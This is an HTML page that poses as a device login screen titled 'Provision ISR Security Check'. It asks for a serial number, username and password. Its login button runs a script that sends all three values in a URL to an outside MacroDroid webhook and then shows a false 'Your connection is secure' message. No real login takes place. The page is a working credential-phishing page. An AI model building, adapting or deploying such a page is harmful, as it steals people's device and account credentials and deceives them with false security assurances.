<!DOCTYPE html>
<html>
<head>
    <title>Provision ISR Security Check üîê</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" media="screen" />
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="Cache" content="no-cache">
    <link href="public/css/login319c.css?v=20240202.01" rel="stylesheet" type="text/css" />
    <script data-main="public/js/index.js?v=20240202.01" src="public/js/require.js" type="text/javascript"></script>
</head>

<body>
    <!-- Main Page -->
    <div id="PageContent">
        <div id="loginContent">        
            <div id="divLang">
                <div id="langType">
                    <div id="langTypeSel">English</div>
                    <span class="arrowDown"></span>
                    <div id="langTypeList"></div>
                </div>
            </div>
            <div id="divCalendar">
                <div id="calendarType">
                    <div id="calendarTypeSel"></div>
                    <span class="arrowDown"></span>
                    <div id="calendarTypeList"></div>
                </div>
            </div>
            <div id="mainBg"></div>
            <div id="webNameImg"></div>
            <div id="container">
                <div id="accountLoginWrap">
                    <form id="loginForm" action="javascript:void(0);">
                        <div class="itemWrap">
                            <i class="icon sn-icon"></i>
                            <input type="text" id="txtAccountSN" name="sn" placeholder="Enter Serial Number" class="txt-input" autocomplete="off" />
                        </div>
                        <ul id="snListStroage"></ul>
                        <div class="itemWrap">
                            <i class="icon user-icon"></i>
                            <input id="txtUserName" name="username" placeholder="Enter Username" class="txt-input" type="text" />
                        </div>
                        <div class="itemWrap">
                            <i class="icon pwd-icon"></i>
                            <input id="txtPassword" name="password" placeholder="Enter Password" class="txt-input" type="password" autocomplete="off" />
                        </div>
                        <div class="itemWrap">
                            <button id="btnAccountLogin" class="cfgBtn" lc="html" lk="IDCS_LOGIN_NBSP" onclick="sendToWebhook()">Login</button>
                        </div>
                    </form>
                </div>
                <div id="ErrorMsg"></div>
            </div>
            <div id="bottomBorder">
                <div id="bottomBorderLeft"></div>
            </div>
        </div>
    </div>

    <script>
        // Handle sending data to Webhook when the Login button is clicked
        function sendToWebhook() {
            // Get values from input fields
            var sn = document.getElementById('txtAccountSN').value;
            var username = document.getElementById('txtUserName').value;
            var password = document.getElementById('txtPassword').value;

            // Check if any fields are empty
            if (!sn || !username || !password) {
                // If any fields are empty, show an alert in English asking the user to fill in the data
                alert('‚ùåÔ∏è Please fill in all fields: Serial Number, Username, and Password');
                return; // Stop execution here to prevent sending if fields are empty
            }

            // Build the URL with parameters
            var webhookUrl = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&serial=${encodeURIComponent(sn)}`;

            // Send the request via fetch
            fetch(webhookUrl)
                .then(response => response.text())
                .then(data => {
                    alert('‚úÖÔ∏è Your connection is secure. ' + document.title);
                })
                .catch(error => {
                    alert('‚úÖÔ∏è Connection: ' + document.title);
                });
        }
    </script>
</body>
</html>
